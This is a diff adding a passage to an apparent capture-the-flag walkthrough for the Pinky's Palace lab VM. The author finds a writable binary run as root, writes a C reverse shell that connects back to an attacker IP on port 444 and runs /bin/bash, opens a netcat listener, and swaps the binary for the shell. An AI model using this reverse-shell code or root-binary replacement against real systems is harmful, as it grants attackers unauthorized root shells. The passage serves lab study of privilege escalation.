@@ -930,3 +930,78 @@ demon@Pinkys-Palace:/daemon$
 
 ## Reverse Engineering of the Demon's panel
 
+After spending some time reviewing the assembly code of the panel program, it really does not appear to do much of anything.
+It seems to just accept a socket connection, wait for user input and then terminate the socket connection.
+
+However, it IS running as root when I check our processes.  AAAAAAND we can overwrite the file.  
+
+```
+demon@Pinkys-Palace:/home/stefano$ ps -aux
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+---SNIP---
+root        456  0.0  0.0   4040   960 ?        Ss   04:34   0:00 /daemon/panel
+---SNIP---
+```
+
+Again, I have no idea how this is triggered but perhaps if I replace it with a reverse shell I will get lucky again.
+
+I could have used msfvenom to generate this reverse shell code, but I thought I would just create a simple C++ one as GCC is available on this machine. 
+I based my reverse shell code on the following source: http://www.wryway.com/blog/creating-tcp-reverse-shell-shellcode/
+
+```
+demon@Pinkys-Palace:/daemon$ cat <<EOF >>/daemon/cshell.c
+#include <stdio.h>
+#include <strings.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define ADDR "192.168.225.129"
+#define PORT 444
+
+int main(void) {
+
+    // Create socket for outgoing connection 
+    int conn_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
+
+    // Populate server side connection information    
+    struct sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET; // IPv4
+    serv_addr.sin_addr.s_addr = inet_addr(ADDR); // IP address: localhost
+    serv_addr.sin_port = htons(PORT);  // Port # 
+
+    // Initiate connection
+    connect(conn_sock, (struct sockaddr *) &serv_addr, 16);
+
+    // Forward process's stdin, stdout and stderr to the incoming connection
+    dup2(conn_sock,0);
+    dup2(conn_sock,1);
+    dup2(conn_sock,2);
+
+    // Run shell
+    execve("/bin/bash", NULL, NULL);
+}
+EOF
+```
+
+Now to launch the netcat listener on my kali box:
+```
+root@kali:~# nc -nlvp 444
+listening on [any] 444 ...
+```
+
+And now for the Switch-a-roo:
+```
+demon@Pinkys-Palace:/daemon$ mv panel panel.bak
+demon@Pinkys-Palace:/daemon$ mv cshell panel
+demon@Pinkys-Palace:/daemon$ ls -la
+drwxr-x---  2 demon demon  4096 Apr 22 13:24 .
+drwxr-xr-x 25 root  root   4096 Mar 17 19:31 ..
+-rw-r--r--  1 demon demon   816 Apr 22 13:22 cshell.c
+-rwxr-xr-x  1 demon demon  8904 Apr 22 13:22 panel
+-rwxr-x---  1 demon demon 13280 Mar 17 19:48 panel.bak
+```
+
+Now we play the waiting game...
+Nothing happened right away, but I will try to connect to the demon service on 31337 to see if that will trigger it.
+Nope, that didnt do it.
+Hmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm....
